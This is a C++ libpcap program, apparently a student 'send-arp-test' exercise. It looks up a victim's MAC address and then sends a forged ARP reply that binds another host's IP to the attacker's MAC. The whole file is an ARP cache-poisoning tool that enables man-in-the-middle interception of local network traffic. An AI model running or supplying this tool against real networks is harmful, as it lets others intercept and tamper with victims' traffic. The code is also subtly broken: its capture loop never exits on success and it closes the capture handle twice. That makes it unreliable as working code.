#include <cstdio>
#include <pcap.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <cstring>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <iostream>
#include "ethhdr.h"
#include "arphdr.h"


struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};

struct ethernet_hdr
{
    u_int8_t  dhost[ETHER_ADDR_LEN];/* destination ethernet address */
    u_int8_t  shost[ETHER_ADDR_LEN];/* source ethernet address */
    u_int16_t type;                 /* protocol */
};

uint8_t* GetMyMac(const char *dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strcpy(ifr.ifr_name, dev);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    static uint8_t macAddressString[6];
    uint8_t *mac = (uint8_t *)ifr.ifr_hwaddr.sa_data;
    for(int i=0; i<6; i++){
        macAddressString[i]=mac[i];
        printf("%02X:", mac[i]);
    }

    return macAddressString;
}

char* GetMyIp(const char *dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strcpy(ifr.ifr_name, dev);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
    return (inet_ntoa(sin->sin_addr));
}

void SendArpRequest(pcap_t *handle, const char *dev, const char *sender_ip, const char *target_ip, uint8_t* my_mac, const char *my_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(my_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac);
    packet.arp_.sip_ = htonl(Ip(my_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // Unknown at this point
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    printf("a");
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    uint8_t mac_addr[6];
    while (true) {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);

            if (res == 0) continue;

            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }

            struct ethernet_hdr *eth_hdr = (struct ethernet_hdr*)packet;

            if(ntohs(eth_hdr->type) != ETHERTYPE_ARP) continue;
            unsigned char* sender_mac = (unsigned char *)(packet + sizeof(struct ethernet_hdr) + 8);
            // packet_base + ethernet_hdr + H/W Type(2byte) + Protocol Type(2byte) + HW len(1byte) + prot len(1byte) + Operation(2byte)


            for(int i =0; i<6; i++){
                mac_addr[i] = sender_mac[i];
            }


        }
    char errbuf[PCAP_ERRBUF_SIZE];
    //pcap_t *handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);

        packet.eth_.dmac_ = Mac(mac_addr);
        packet.arp_.tmac_ = Mac(mac_addr);
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.sip_ = htonl(Ip(target_ip));

        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));


        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        printf("ARP SPOOFING!!\n");

        pcap_close(handle);
}

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test wlan0 ip1 ip2\n");
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char dev[IFNAMSIZ];
    printf("%s\n",argv[1]);
    strncpy(dev, argv[1], IFNAMSIZ - 1);
    dev[IFNAMSIZ - 1] = '\0';

    char *sender_ip = argv[2];
    char *target_ip = argv[3];

    //printf("My IP: %s\n", my_ip);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    SendArpRequest(handle, dev, sender_ip, target_ip, GetMyMac(dev), GetMyIp(dev));

    pcap_close(handle);
    return 0;
}
